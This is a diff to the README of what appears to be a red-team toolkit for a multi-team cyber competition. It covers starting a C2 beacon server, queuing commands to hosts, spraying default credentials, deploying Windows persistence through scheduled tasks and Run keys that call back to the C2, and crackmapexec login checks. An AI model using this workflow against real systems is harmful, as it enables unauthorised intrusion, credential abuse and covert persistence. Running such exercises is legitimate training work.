@@ -128,6 +128,8 @@ If a script needs SSH key authentication, it will prompt to create an SSH key if
 python3 payloads/portal_gun.py --port 8080
 ```
 
+The C2 server is a lightweight beacon receiver and dashboard. It does **not** establish persistence by itself. Start the C2 first, then deploy persistence so hosts beacon back to this server.
+
 C2 endpoints:
 
 ```
@@ -141,10 +143,17 @@ http://RED_TEAM_IP:8080/stats       - JSON statistics
 
 The server uses the local IP from `ip a` unless `RED_TEAM_IP` is set in the environment.
 
+Queue a command to a specific host (command is returned on the next beacon):
+
+```bash
+python3 payloads/portal_gun.py --command HOSTNAME "whoami"
+```
+
 ### 2) Run Credential Spray
 
 ```bash
 python3 init_access/default_cred_spray.py --teams 1-12 --json results.json
+python3 init_access/default_cred_spray.py --teams 1-12 --disable-ftp --disable-mysql
 ```
 
 ### 3) Deploy Persistence
@@ -153,7 +162,7 @@ python3 init_access/default_cred_spray.py --teams 1-12 --json results.json
 python3 orchestrator/persistence.py --teams-count 12 --targets all
 ```
 
-Persistence uses the local IP from `ip a` for beacon callbacks.
+Persistence uses the local IP from `ip a` for beacon callbacks. The Windows workflow uses a scheduled task plus a Run key to call back into the C2 server.
 
 ### 4) Service Degradation
 
@@ -203,19 +212,28 @@ Cron:
 ```
 Directories:
   %TEMP%\ApertureScience\
-  %APPDATA%\Microsoft\Windows\Wheatley\
 
 Scheduled Tasks:
   ApertureEnrichment
-  WindowsDefenderUpdate (decoy name)
 
 Registry:
-  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ApertureUpdate
-  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsOptimization
+  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\CompanionCube
+```
 
-Startup:
-  %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.lnk
-  %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\update.vbs
+Manual connectivity checks (if needed):
+
+```bash
+# SMB
+crackmapexec smb <ip> -u <user> -p <pass>
+
+# WinRM
+crackmapexec winrm <ip> -u <user> -p <pass>
+
+# FTP
+ftp <ip>
+
+# MySQL
+mysql -h <ip> -u <user> -p
 ```
 
 ## Blue Team Remediation Hints
